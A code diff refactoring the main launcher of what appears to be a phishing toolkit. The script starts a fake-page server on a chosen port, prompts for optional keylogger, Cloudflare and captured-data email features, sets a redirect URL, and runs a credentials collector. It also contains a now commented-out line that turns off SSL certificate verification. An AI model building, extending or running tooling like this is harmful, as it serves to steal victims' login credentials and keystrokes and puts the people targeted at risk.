@@ -4,42 +4,39 @@
 #    This is free software, and you are welcome to redistribute it
 #    under certain conditions; you can read LICENSE for details.
 #
-from os import system, environ
+import multiprocessing
+import ssl
+from os import environ
+
 import Defs.ActionManager.main_runner as main_runner
-import Defs.FeatureManager.keylogger as keylogger
-import Defs.FeatureManager.cloudflare as cloudflare
-import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
 import Defs.ActionManager.Server.server_runner as server_runner
 import Defs.ActionManager.simple_informant as simple_informant
-import multiprocessing
-import sys
-import ssl
+import Defs.FeatureManager.feature_prompt as prompt
+from controllers.EULA_controller import EULAController
+from controllers.connection_controller import ConnectionController
+if EULAController().check_eula_existence() is False:
+    EULAController().generate_new_eula()
+if EULAController().check_eula_confirmation() is False:
+    EULAController().confirm_eula()
 
+# if not environ.get("PYTHONHTTPSVERIFY", "") and getattr(
+#         ssl, "_create_unverified_context", None):
+#     ssl._create_default_https_context = ssl._create_unverified_context
 
-simple_informant.license_handler()
-agreement = simple_informant.terms_of_service_message()
-if not agreement:
-    exit()
-
-if not environ.get('PYTHONHTTPSVERIFY', "") and getattr(ssl, '_create_unverified_context', None):
-    ssl._create_default_https_context = ssl._create_unverified_context
-
-simple_informant.check_permissions()
-simple_informant.verify_connection()
+# simple_informant.check_permissions()
 # verCheck() # For now it's useless, i'll rewrite it later, after release.
-simple_informant.check_php()
-#checkLocalxpose()
 
-#checkOpenport()
-#checkPagekite()
-#checkLT()
+###########  simple_informant.check_php()  # FIXME we have to replace PHP with Python
+# checkLocalxpose()
+ConnectionController().verify_connection()
+# checkOpenport()
+# checkPagekite()
+# checkLT()
 
 if __name__ == "__main__":
     try:
         main_runner.start_main_menu()
-        keylogger.add_keylogger_prompt()
-        cloudflare.add_cloudflare_prompt()
-        email_prompt.captured_data_email_prompt()
+        prompt.feature_prompt()
         main_runner.enter_custom_redirecting_url()
         port = simple_informant.port_selector()
 
@@ -47,10 +44,12 @@ if __name__ == "__main__":
         server_runner.start_server(port)
         server_runner.server_selection(port)
 
-        multiprocessing.Process(target=server_runner.start_server, args=(port,)).start()
-        simple_informant.credentials_collector(port)
+        multiprocessing.Process(target=server_runner.start_server,
+                                args=(port, )).start()
+        simple_informant.credentials_collector()
 
     except KeyboardInterrupt:
-        port = '8080' # When Keyword Interrupt Occurs before defining Port by User. Script will use 8080 port.(Just To Remove Exception Errors)
+        # When Keyword Interrupt Occurs script will use 8080 port.(Just To Remove Exception Errors)
+        port = "8080"
         simple_informant.exit_message(port)
         exit()
